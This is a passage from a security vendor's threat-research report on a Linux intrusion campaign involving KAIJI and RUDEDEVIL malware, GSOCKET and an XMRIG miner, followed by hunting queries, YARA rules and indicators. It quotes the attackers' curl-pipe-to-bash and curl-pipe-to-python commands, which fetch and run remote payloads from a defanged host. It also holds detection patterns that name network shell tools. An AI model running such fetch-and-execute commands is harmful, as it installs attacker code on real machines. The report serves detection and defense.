<p>Upon further investigation into the Bitcoin address, we found that this address has performed a single transaction.</p>
<p></p>
<p>Interestingly, the output address for this transaction points to a well-known <a href="https://www.ledger.com/academy/topics/security/hot-wallet-vs-cold-crypto-wallet-whats-the-difference">hot wallet</a> associated with Binance, indicating that the attackers may have transferred their mining earnings to an exchange platform.</p>
<p></p>
<p>When returning our focus back to the script, we also see two commands commented out, which will become more clear later. The script executes:</p>
<pre><code>curl -s http://gcp.pagaelrescate[.]com:8080/cycnet | bash</code></pre>
<p>Looking at this payload, we can see the following contents:</p>
<p></p>
<p>This stage checks the output of the command, and sends this to a Telegram chat bot. Through our Telegram behavioral rule, we can see that a Telegram POST request looks like this:</p>
<p>The cron job that is set up during this stage executes at minute 0, every 4th hour. This job executes:</p>
<pre><code>curl -s http://gcp.pagaelrescate[.]com:8080/testslot/enviador_slot | python3</code></pre>
<p>The downloaded Python script automates interactions with an online gambling game through HTTP requests. The script includes functions that handle user authentication, betting, processing the outcomes, and sending data to a remote server.</p>
<p>Upon closer examination, we identified the following key components of the script:</p>
<p><strong>Global Variables:</strong></p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">usuario</code>: Stores the user ID for managing the session.</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">apuesta</code>: Represents the bet amount.</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ganancias</code>: Tracks the winnings and losses.</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">saldo_actual</code>: Holds the current account balance.</li>
</ul>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="understanding-the-obteneruid-function" class="absolute -top-32"></span>Understanding the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">obteneruid</code> Function</h4>
<p>This function authenticates the user by sending a POST request with the necessary headers and JSON data to the remote server. If the user is not already set, it initializes a new session and retrieves the account balance. Upon successful authentication, it returns a session UUID, which is used for further interactions in the game.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="understanding-the-enviardatos-function" class="absolute -top-32"></span>Understanding the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">enviardatos</code> Function</h4>
<p>This function sends game data or status updates back to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">gcp.pagaelrescate[.]com</code>, logging the results or actions taken during gameplay. It uses a simple GET request to transmit this data to the remote server.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="understanding-the-hacerjugada-function" class="absolute -top-32"></span>Understanding the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hacerjugada</code> Function</h4>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">hacerjugada</code> function simulates the betting process for a set number of rounds. It sends POST requests to place bets, updates the winnings or losses after each round, and calculates the overall results. If a bonus round is triggered, it calls <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">completarbono()</code> to handle any bonus game details. Between each betting round, the function enforces a 30-second delay to mimic natural gameplay and avoid detection.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="understanding-the-completarbono-function" class="absolute -top-32"></span>Understanding the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">completarbono</code> Function</h4>
<p>When a bonus round is triggered, this function completes the round by sending a request containing the session ID and round ID. Based on the result, it updates the account balance and logs the winnings or losses. Any change in the balance is sent back to the remote server using the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">enviardatos()</code> function.</p>
<p></p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="likely-used-for-testing-purposes" class="absolute -top-32"></span>Likely Used for Testing Purposes</h4>
<p>It’s important to note that this script is likely being used for testing purposes, as it interacts with the demo version of the gambling app. This suggests that the attackers might be testing the automation of gambling actions or trying to find vulnerabilities in the app before moving to the live version. The use of a demo environment implies they are refining their approach, potentially in preparation for more sophisticated or widespread attacks.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="ref6138-through-mitre-attck" class="absolute -top-32"></span>REF6138 through MITRE ATT&amp;CK</h2>
<p>Elastic uses the <a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a> framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks. During this investigation, we identified the following tactics, techniques and sub-techniques:</p>
<p><em>MITRE ATT&amp;CK tactics, techniques and sub-techniques used</em></p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Tactic</th><th>Technique</th><th>Sub-Technique</th></tr></thead><tbody><tr><td>Resource Development</td><td>T1587: Develop Capabilities</td><td>Malware</td></tr><tr><td></td><td>T1588: Obtain Capabilities</td><td>Tool</td></tr><tr><td></td><td>T1608: Stage Capabilities</td><td>Upload Malware</td></tr><tr><td></td><td></td><td>Upload Tool</td></tr><tr><td>Initial Access</td><td>T1190: Exploit Public-Facing Application</td><td></td></tr><tr><td>Execution</td><td>T1059: Command and Scripting Interpreter</td><td>Unix Shell</td></tr><tr><td></td><td></td><td>Python</td></tr><tr><td></td><td>T1053: Scheduled Task/Job</td><td>Cron</td></tr><tr><td>Persistence</td><td>T1546: Event Triggered Execution</td><td>Unix Shell Configuration Modification</td></tr><tr><td></td><td>T1053: Scheduled Task/Job</td><td>Cron</td></tr><tr><td></td><td>T1505: Server Software Component</td><td>Web Shell</td></tr><tr><td>Privilege Escalation</td><td>T1068: Exploitation for Privilege Escalation</td><td></td></tr><tr><td>Defense Evasion</td><td>T1140: Deobfuscate/Decode Files or Information</td><td></td></tr><tr><td></td><td>T1222: File and Directory Permissions Modification</td><td>Linux and Mac File and Directory Permissions Modification</td></tr><tr><td></td><td>T1564: Hide Artifacts</td><td>Hidden Files and Directories</td></tr><tr><td></td><td>T1070: Indicator Removal</td><td>Timestomp</td></tr><tr><td></td><td>T1036: Masquerading</td><td>Masquerade Task or Service</td></tr><tr><td></td><td>T1027: Obfuscated Files or Information</td><td>Software Packing</td></tr><tr><td></td><td></td><td>Stripped Payloads</td></tr><tr><td></td><td></td><td>Command Obfuscation</td></tr><tr><td></td><td></td><td>Encrypted/Encoded File</td></tr><tr><td>Discovery</td><td>T1057: Process Discovery</td><td></td></tr><tr><td></td><td>T1082: System Information Discovery</td><td></td></tr><tr><td></td><td>T1061: System Network Configuration Discovery</td><td></td></tr><tr><td></td><td>T1049: System Network Connections Discovery</td><td></td></tr><tr><td></td><td>T1007: System Service Discovery</td><td></td></tr><tr><td>Collection</td><td>T1119: Automated Collection</td><td></td></tr><tr><td></td><td>T1005: Data from Local System</td><td></td></tr><tr><td>Command and Control</td><td>T1071: Application Layer Protocol</td><td>Web Protocols</td></tr><tr><td></td><td>T1132: Data Encoding</td><td>Standard Encoding</td></tr><tr><td></td><td>T1001: Data Obfuscation</td><td></td></tr><tr><td></td><td>T1573: Encrypted Channel</td><td>Symmetric Cryptography</td></tr><tr><td></td><td>T1105: Ingress Tool Transfer</td><td></td></tr><tr><td></td><td>T1571: Non-Standard Port</td><td></td></tr><tr><td></td><td>T1572: Protocol Tunneling</td><td></td></tr><tr><td></td><td>T1102: Web Service</td><td></td></tr><tr><td>Impact</td><td>T1496: Resource Hijacking</td><td></td></tr></tbody></table></div>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="detecting-ref6138" class="absolute -top-32"></span><strong>Detecting REF6138</strong></h2>
<p>Elastic Security implements a multi-layer approach to threat detection, leveraging behavioral SIEM and Endpoint rules, YARA signatures and ML-based anomaly detection approaches. This section describes the detections built by Elastic Security that play a big role in capturing the identified threats.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="detection" class="absolute -top-32"></span>Detection</h3>
<p>The following detection rules were observed throughout the analysis of this intrusion set:</p>
<ul>
<li><a href="https://github.com/elastic/detection-rules/blob/main/rules_building_block/execution_linux_segfault.toml">Segfault Detection</a></li>
<li><a href="https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/defense_evasion_timestomp_touch.toml">Timestomping using Touch Command</a></li>
<li><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_shell_configuration_modification.toml">Shell Configuration Creation or Modification</a></li>
<li><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/defense_evasion_binary_copied_to_suspicious_directory.toml">System Binary Moved or Copied</a></li>
</ul>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="prevention" class="absolute -top-32"></span>Prevention</h3>
<p>The following behavior prevention events were observed throughout the analysis of this intrusion set:</p>
<ul>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_linux_reverse_shell_via_suspicious_utility.toml">Linux Reverse Shell via Suspicious Utility</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/defense_evasion_defense_evasion_via_bind_mount.toml">Defense Evasion via Bind Mount</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_linux_suspicious_child_process_execution_via_interactive_shell.toml">Linux Suspicious Child Process Execution via Interactive Shell</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_potential_linux_hack_tool_launched.toml">Potential Linux Hack Tool Launched</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/privilege_escalation_privilege_escalation_via_pkexec_exploitation.toml">Privilege Escalation via PKEXEC Exploitation</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/lateral_movement_potential_ssh_it_ssh_worm_downloaded.toml">Potential SSH-IT SSH Worm Downloaded</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_scheduled_job_executing_binary_in_unusual_location.toml">Scheduled Job Executing Binary in Unusual Location</a></li>
</ul>
<p>The following YARA Signatures are in place to detect the KAIJI and RUDEDEVIL malware samples both as file and in-memory:</p>
<ul>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Linux_Generic_Threat.yar">Linux.Generic.Threat</a></li>
<li><a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Linux_Hacktool_Flooder.yar">Linux.Hacktool.Flooder</a></li>
</ul>
<p>The following, soon to be released, endpoint rule alerts were observed throughout the analysis of this intrusion set:</p>
<ul>
<li>Potential Shell via Web Server</li>
<li>Potential Web Server Code Injection</li>
<li>Potential Shell Executed by Web Server User</li>
<li>Decode Activity via Web Server</li>
<li>Linux Telegram API Request</li>
<li>Suspicious Echo Execution</li>
</ul>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-queries-in-elastic" class="absolute -top-32"></span>Hunting queries in Elastic</h3>
<p>The events for both KQL and EQL are provided with the Elastic Agent using the Elastic Defend integration. Hunting queries could return high signals or false positives. These queries are used to identify potentially suspicious behavior, but an investigation is required to validate the findings.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="eql-queries" class="absolute -top-32"></span>EQL queries</h4>
<p>Using the Timeline section of the Security Solution in Kibana under the “Correlation” tab, you can use the below EQL queries to hunt for behaviors similar:</p>
<p><strong>Potential XMRIG Execution</strong></p>
<p>The following EQL query can be used to hunt for XMRIG executions within your environment.</p>
<pre><code>process where event.type == &quot;start&quot; and event.action == &quot;exec&quot; and (
  (
    process.args in (&quot;-a&quot;, &quot;--algo&quot;) and process.args in (
      &quot;gr&quot;, &quot;rx/graft&quot;, &quot;cn/upx2&quot;, &quot;argon2/chukwav2&quot;, &quot;cn/ccx&quot;, &quot;kawpow&quot;, &quot;rx/keva&quot;, &quot;cn-pico/tlo&quot;, &quot;rx/sfx&quot;, &quot;rx/arq&quot;,
      &quot;rx/0&quot;, &quot;argon2/chukwa&quot;, &quot;argon2/ninja&quot;, &quot;rx/wow&quot;, &quot;cn/fast&quot;, &quot;cn/rwz&quot;, &quot;cn/zls&quot;, &quot;cn/double&quot;, &quot;cn/r&quot;, &quot;cn-pico&quot;,
      &quot;cn/half&quot;, &quot;cn/2&quot;, &quot;cn/xao&quot;, &quot;cn/rto&quot;, &quot;cn-heavy/tube&quot;, &quot;cn-heavy/xhv&quot;, &quot;cn-heavy/0&quot;, &quot;cn/1&quot;, &quot;cn-lite/1&quot;,
      &quot;cn-lite/0&quot;, &quot;cn/0&quot;
    )
  ) or
  (
    process.args == &quot;--coin&quot; and process.args in (&quot;monero&quot;, &quot;arqma&quot;, &quot;dero&quot;)
  )
) and process.args in (&quot;-o&quot;, &quot;--url&quot;)</code></pre>
<p><strong>MSR Write Access Enabled</strong></p>
<p>XMRIG leverages modprobe to enable write access to MSR. This activity is abnormal, and should not occur by-default.</p>
<pre><code>process where event.type == &quot;start&quot; and event.action == &quot;exec&quot; and process.name == &quot;modprobe&quot; and
process.args == &quot;msr&quot; and process.args == &quot;allow_writes=on&quot;</code></pre>
<p><strong>Potential GSOCKET Activity</strong></p>
<p>This activity is default behavior when deploying GSOCKET through the recommended deployment methods. Additionally, several arguments are added to the query to decrease the chances of missing a more customized intrusion through GSOCKET.</p>
<pre><code>process where event.type == &quot;start&quot; and event.action == &quot;exec&quot; and
process.name in (&quot;bash&quot;, &quot;dash&quot;, &quot;sh&quot;, &quot;tcsh&quot;, &quot;csh&quot;, &quot;zsh&quot;, &quot;ksh&quot;, &quot;fish&quot;) and
process.command_line : (
&quot;*GS_ARGS=*&quot;, &quot;*gs-netcat*&quot;, &quot;*gs-sftp*&quot;, &quot;*gs-mount*&quot;, &quot;*gs-full-pipe*&quot;, &quot;*GS_NOINST=*&quot;, &quot;*GSOCKET_ARGS=*&quot;, &quot;*GS_DSTDIR=*&quot;, &quot;*GS_URL_BASE=*&quot;, &quot;*GS_OSARCH=*&quot;, &quot;*GS_DEBUG=*&quot;, &quot;*GS_HIDDEN_NAME=*&quot;, &quot;*GS_HOST=*&quot;, &quot;*GS_PORT=*&quot;, &quot;*GS_TG_TOKEN=*&quot;, &quot;*GS_TG_CHATID=*&quot;, &quot;*GS_DISCORD_KEY=*&quot;, &quot;*GS_WEBHOOK_KEY=*&quot;
)</code></pre>
<p><strong>Potential Process Masquerading via Exec</strong></p>
<p>GSOCKET leverages the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">exec -a</code> method to run a process under a different name. GSOCKET specifically leverages masquerades as kernel processes, but other malware may masquerade differently.</p>
<pre><code>process where event.type == &quot;start&quot; and event.action == &quot;exec&quot; and
process.name in (&quot;bash&quot;, &quot;dash&quot;, &quot;sh&quot;, &quot;tcsh&quot;, &quot;csh&quot;, &quot;zsh&quot;, &quot;ksh&quot;, &quot;fish&quot;) and process.args == &quot;-c&quot; and process.command_line : &quot;* exec -a *&quot;</code></pre>
<p><strong>Renice or Ulimit Execution</strong></p>
<p>Several malwares, including KAIJI and RUDEDEVIL, leverage the renice utility to change the priority of processes or set resource limits for processes. This is commonly used by miner malware to increase the priority of mining processes to maximize the mining performance.</p>
<pre><code>process where event.type == &quot;start&quot; and event.action == &quot;exec&quot; and (
  process.name in (&quot;ulimit&quot;, &quot;renice&quot;) or (
  process.name in (&quot;bash&quot;, &quot;dash&quot;, &quot;sh&quot;, &quot;tcsh&quot;, &quot;csh&quot;, &quot;zsh&quot;, &quot;ksh&quot;, &quot;fish&quot;) and process.args == &quot;-c&quot; and
  process.command_line : (&quot;*ulimit*&quot;, &quot;*renice*&quot;)
  )
)</code></pre>
<p><strong>Inexistent Cron(d) Service Started</strong></p>
<p>Both KAIJI and RUDEDEVIL establish persistence through the creation of a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cron(d)</code> service in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/init.d/cron(d)</code>. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Cron</code>, by default, does not use a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SysV Init</code> service. Execution of a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cron(d)</code> service is suspicious, and should be analyzed further.</p>
<pre><code>process where event.type == &quot;start&quot; and event.action == &quot;exec&quot; and 
  process.name == &quot;systemctl&quot; and process.args == &quot;start&quot; and process.args in 
  (&quot;cron.service&quot;, &quot;crond.service&quot;, &quot;cron&quot;, &quot;crond&quot;)</code></pre>
<p><strong>Suspicious /etc/ Process Execution from KAIJI</strong></p>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/</code> directory is not a commonly used directory for process executions. KAIJI is known to place a binary called <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">32678</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">id.services.conf</code> in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/</code> directory, to establish persistence and evade detection.</p>
<pre><code>process where event.type == &quot;start&quot; and event.action == &quot;exec&quot; and (process.executable regex &quot;&quot;&quot;/etc/[0-9].*&quot;&quot;&quot; or process.executable : (&quot;/etc/*.conf&quot;, &quot;/etc/.*&quot;))</code></pre>
<p><strong>Hidden File Creation in /dev/ directory</strong></p>
<p>Creating hidden files in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/dev/</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/dev/shm/</code> are not inherently malicious, however, this activity should be uncommon. KAIJI, GSOCKET and other malwares such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">K4SPREADER</code> are known to drop hidden files in these locations.</p>
<pre><code>file where event.type == &quot;creation&quot; and file.path : (&quot;/dev/shm/.*&quot;, &quot;/dev/.*&quot;)</code></pre>
<p><strong>Suspicious Process Execution from Parent Executable in /boot/</strong></p>
<p>Malwares such as KAIJI and XORDDOS are known to place executable files in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/boot/</code> directory, and leverage these to establish persistence while attempting to evade detection.</p>
<pre><code>process where event.type == &quot;start&quot; and event.action == &quot;exec&quot; and process.parent.executable : &quot;/boot/*&quot;</code></pre>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="yara" class="absolute -top-32"></span>YARA</h4>
<p>Elastic Security has created YARA rules to identify this activity. Below is the YARA rule to identify the custom <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Apache2</code> malware:</p>
<pre><code>rule Linux_Trojan_Generic {
    meta:
        author = &quot;Elastic Security&quot;
        creation_date = &quot;2024-09-20&quot;
        last_modified = &quot;2024-09-20&quot;
        os = &quot;Linux&quot;
        arch = &quot;x86&quot;
        threat_name = &quot;Linux.Trojan.Generic&quot;
        reference = &quot;https://www.elastic.co/security-labs/betting-on-bots&quot;
        license = &quot;Elastic License v2&quot;

    strings:
        $enc1 = { 74 73 0A 1C 1A 54 1A 11 54 0C 18 43 59 5B 3A 11 0B 16 14 10 0C 14 5B }
        $enc2 = { 18 1A 1A 1C 09 0D 43 59 0D 1C 01 0D 56 11 0D 14 15 55 18 09 09 15 10 }
        $enc3 = { 18 1A 1A 1C 09 0D 54 15 18 17 1E 0C 18 1E 1C 43 59 0B 0C }
        $enc4 = { 34 16 03 10 15 15 18 56 4C 57 49 59 51 2E 10 17 1D 16 0E 0A 59 37 }
        $key = &quot;yyyyyyyy&quot;
    condition:
        1 of ($enc*) and $key
}</code></pre>
<p>To detect GSOCKET, including several of its adjacent tools, we created the following signature:</p>
<pre><code>rule Multi_Hacktool_Gsocket {
    meta:
        author = &quot;Elastic Security&quot;
        creation_date = &quot;2024-09-20&quot;
        last_modified = &quot;2024-09-23&quot;
        os = &quot;Linux, MacOS&quot;
        arch = &quot;x86&quot;
        threat_name = &quot;Multi.Hacktool.Gsocket&quot;
        reference = &quot;https://www.elastic.co/security-labs/betting-on-bots&quot;
        license = &quot;Elastic License v2&quot;

    strings:
        $str1 = &quot;gsocket: gs_funcs not found&quot;
        $str2 = &quot;/share/gsocket/gs_funcs&quot;
        $str3 = &quot;$GSOCKET_ARGS&quot;
        $str4 = &quot;GSOCKET_SECRET&quot;
        $str5 = &quot;GS_HIJACK_PORTS&quot;
        $str6 = &quot;sftp -D gs-netcat&quot;
        $str7 = &quot;GS_NETCAT_BIN&quot;
        $str8 = &quot;GSOCKET_NO_GREETINGS&quot;
        $str9 = &quot;GS-NETCAT(1)&quot;
        $str10 = &quot;GSOCKET_SOCKS_IP&quot;
        $str11 = &quot;GSOCKET_SOCKS_PORT&quot;
        $str12 = &quot;gsocket(1)&quot;
        $str13 = &quot;gs-sftp(1)&quot;
        $str14 = &quot;gs-mount(1)&quot;
    condition:
        3 of them
}</code></pre>
<p>Finally, the following signature was written to detect the <a href="https://github.com/nicocha30/ligolo-ng">open source Ligolo-ng tool</a>, as we have reason to believe this tool was used during this intrusion.</p>
<pre><code>rule Linux_Hacktool_LigoloNG {
    meta:
        author = &quot;Elastic Security&quot;
        creation_date = &quot;2024-09-20&quot;
        last_modified = &quot;2024-09-20&quot;
        os = &quot;Linux&quot;
        arch = &quot;x86&quot;
        threat_name = &quot;Linux.Hacktool.LigoloNG&quot;
        reference = &quot;https://www.elastic.co/security-labs/betting-on-bots&quot;
        license = &quot;Elastic License v2&quot;

    strings:
        $a = &quot;https://github.com/nicocha30/ligolo-ng&quot;
        $b = &quot;@Nicocha30!&quot;
        $c = &quot;Ligolo-ng %s / %s / %s&quot;
    condition:
        all of them
}</code></pre>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="defensive-recommendations" class="absolute -top-32"></span>Defensive recommendations</h3>
<p>To effectively defend against malware campaigns and minimize the risk of intrusion, it’s crucial to implement a multi-layered approach to security. Here are some key defensive measures you should prioritize:</p>
<ol>
<li><strong>Keep Your Elastic Detection Rules Updated and Enabled</strong>: Ensure that your security tools, including any pre-built detection rules, are up to date. Continuous updates allow your systems to detect the latest malware signatures and behaviors.</li>
<li><strong>Enable Prevention Mode in Elastic Defend</strong>: Configure Elastic Defend in prevention mode to automatically block known threats rather than just alerting on them. Prevention mode ensures proactive defense against malware and exploits.</li>
<li><strong>Monitor Alerts and Logs</strong>: Regularly monitor alerts, logs, and servers for any signs of suspicious activity. Early detection of unusual behavior can help prevent a small breach from escalating into a full-blown compromise.</li>
<li><strong>Conduct Threat Hunting</strong>: Proactively investigate your environment for hidden threats that may have evaded detection. Threat hunting can uncover advanced attacks and persistent malware that bypass traditional security measures.</li>
<li><strong>Implement Web Application Firewalls (WAFs)</strong>: Use a WAF to block unauthorized or malicious traffic. A properly configured firewall can prevent many common web attacks.</li>
<li><strong>Enforce Strong Authentication for SSH</strong>: Use public/private key authentication for SSH access to protect against brute force attacks.</li>
<li><strong>Write Secure Code</strong>: Ensure that all custom software, especially web server technology, follows secure coding practices. Engaging professional security auditors to review your code can help identify and mitigate vulnerabilities before they are exploited.</li>
<li><strong>Regularly Patch and Update Systems</strong>: Keeping servers, applications, and software up to date is essential to defending against known vulnerabilities. Prompt patching minimizes the risk of being targeted by off-the-shelf exploits.</li>
</ol>
<p>By following these recommendations, you can significantly reduce the attack surface and strengthen your defense against ongoing or potential malware threats.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="observations" class="absolute -top-32"></span>Observations</h2>
<p>The following observables were discussed in this research. These are available for download in STIX or ECS format <a href="https://github.com/elastic/labs-releases/tree/main/indicators/ref6138">here</a>.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Observable</th><th>Type</th><th>Name</th><th>Reference</th></tr></thead><tbody><tr><td>72ac2877c9e4cd7d70673c0643eb16805977a9b8d55b6b2e5a6491db565cee1f</td><td>SHA-256</td><td>SystemdXC</td><td>XMRIG</td></tr><tr><td>82c55c169b6cb5e348be6e202163296b2b5d80fff2be791c21da9a8b84188684</td><td>SHA-256</td><td>apache2</td><td>apache2_unpacked</td></tr><tr><td>0fede7231267afc03b096ee6c1d3ded479b10ab235e260120bc9f68dd1fc54dd</td><td>SHA-256</td><td>apache2_upx_packed</td><td>apache2_upx_packed</td></tr><tr><td>9ee695e55907a99f097c4c0ad4eb24ae5cf3f8215e9904d787817f1becb9449e</td><td>SHA-256</td><td>download.sh</td><td>KAIJI Stager</td></tr><tr><td>1cdfb522acb1ad0745a4b88f072e40bf9aa113b63030fe002728bac50a46ae79</td><td>SHA-256</td><td>linux_386</td><td>KAIJI x86</td></tr><tr><td>d0ef2f020082556884361914114429ed82611ef8de09d878431745ccd07c06d8</td><td>SHA-256</td><td>linux_amd64</td><td>KAIJI x64</td></tr><tr><td>ad36cf59b5eb08799a50e9aece6f12cdfe8620062606ac6684d3b4509acc681b</td><td>SHA-256</td><td>linux_arm5</td><td>KAIJI ARM5</td></tr><tr><td>792a84a5bc8530285e2f6eb997054edb3d43460a99a089468e2cf81b5fd5cde6</td><td>SHA-256</td><td>linux_arm6</td><td>KAIJI ARM6</td></tr><tr><td>e19fb249db323d2388e91f92ff0c8a7a169caf34c3bdaf4d3544ce6bfb8b88b4</td><td>SHA-256</td><td>linux_arm64</td><td>KAIJI ARM64</td></tr><tr><td>3847c06f95dd92ec482212116408286986bb4b711e27def446fb4a524611b745</td><td>SHA-256</td><td>linux_arm7</td><td>KAIJI ARM7</td></tr><tr><td>fffee23324813743b8660282ccd745daa6fb058f2bf84b9960f70d888cd33ba0</td><td>SHA-256</td><td>linux_mips</td><td>KAIJI MIPS</td></tr><tr><td>6d40b58e97c7b4c34f7b5bdac88f46e943e25faa887e0e6ce5f2855008e83f55</td><td>SHA-256</td><td>linux_mips64</td><td>KAIJI MIPS64</td></tr><tr><td>0c3442b8c49844a1ee41705a9e4a710ae3c7cde76c69c2eab733366b2aa34814</td><td>SHA-256</td><td>linux_mips64el</td><td>KAIJI MIPS64 little-endian</td></tr><tr><td>310973f6f186947cb7cff0e7b46b4645acdd71e90104f334caa88a4fa8ad9988</td><td>SHA-256</td><td>linux_mips_softfloat</td><td>KAIJI MIPS softfloat</td></tr><tr><td>0d24a2e7da52bad03b0bda45c8435a29c4e1c9b483e425ae71b79fd122598527</td><td>SHA-256</td><td>linux_mipsel</td><td>KAIJI MIPS little-endian</td></tr><tr><td>36fc8eef2e1574e00ba3cf9e2267d4d295f6e9f138474e3bd85eb4d215f63196</td><td>SHA-256</td><td>linux_mipsel_softfloat</td><td>KAIJI MIPS little-endian softfloat</td></tr><tr><td>3c25a4406787cc5089e83e00350e49eb9f192d03d69e7a61b780b6828db1344f</td><td>SHA-256</td><td>linux_ppc64</td><td>KAIJI PPC64</td></tr><tr><td>7c16149db7766c6fd89f28031aa123408228f045e90aa03828c02562d9f9d1d7</td><td>SHA-256</td><td>linux_ppc64el</td><td>KAIJI PPC64 little-endian</td></tr><tr><td>09f935acbac36d224acfb809ad82c475d53d74ab505f057f5ac40611d7c3dbe7</td><td>SHA-256</td><td>l64_v0</td><td>RUDEDEVIL/LUFICER x64 version 0</td></tr><tr><td>ea0068702ea65725700b1dad73affe68cf29705c826d12a497dccf92d3cded46</td><td>SHA-256</td><td>l64_v1</td><td>RUDEDEVIL/LUFICER x64 version 1</td></tr><tr><td>160f232566968ade54ee875def81fc4ca69e5507faae0fceb5bef6139346496a</td><td>SHA-256</td><td>l64_v2</td><td>RUDEDEVIL/LUFICER x64 version 2</td></tr><tr><td>89b60cedc3a4efb02ceaf629d6675ec9541addae4689489f3ab8ec7741ec8055</td><td>SHA-256</td><td>l64_v3</td><td>RUDEDEVIL/LUFICER x64 version 3</td></tr><tr><td>20899c5e2ecd94b9e0a8d1af0114332c408fb65a6eb3837d4afee000b2a0941b</td><td>SHA-256</td><td>l86_v0</td><td>RUDEDEVIL/LUFICER x86 version 0</td></tr><tr><td>728dce11ffd7eb35f80553d0b2bc82191fe9ff8f0d0750fcca04d0e77d5be28c</td><td>SHA-256</td><td>l86_v1</td><td>RUDEDEVIL/LUFICER x86 version 